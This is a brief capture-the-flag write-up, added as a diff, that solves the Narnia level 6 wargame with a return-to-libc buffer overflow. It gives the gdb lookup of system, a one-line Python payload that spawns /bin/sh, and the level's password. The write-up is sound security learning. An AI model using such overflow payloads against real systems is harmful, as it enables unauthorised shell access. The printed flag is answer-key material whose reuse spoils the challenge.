@@ -1,0 +1,21 @@
+Okay so this is my first time doing return to libc attack.
+When running the executable, it takes in 2 arguments, and prints out the first one
+./narnia6 jake mai
+-> jake
+
+in the source code, b1 and b2 are variables that hold argv[1] and argv[2]
+however they only have 8 bytes each.
+
+#include <stdlib.h> header is used in this program
+
+we find the memory address of system inside gdb
+p system
+$1 = {<text variable, no debug info>} 0xf7e4c850 <system>
+
+we need to overflow b1 and b2, followed by the address of system, and execute the shell
+./narnia6 $(python -c 'print("XXXXXXXX"+"\x50\xc8\xe4\xf7" + " XXXXXXXX"+"/bin/sh")')
+
+we got a shell!
+cat /etc/narnia_pass/narnia7
+
+flag retrieved: ahkiaziphu
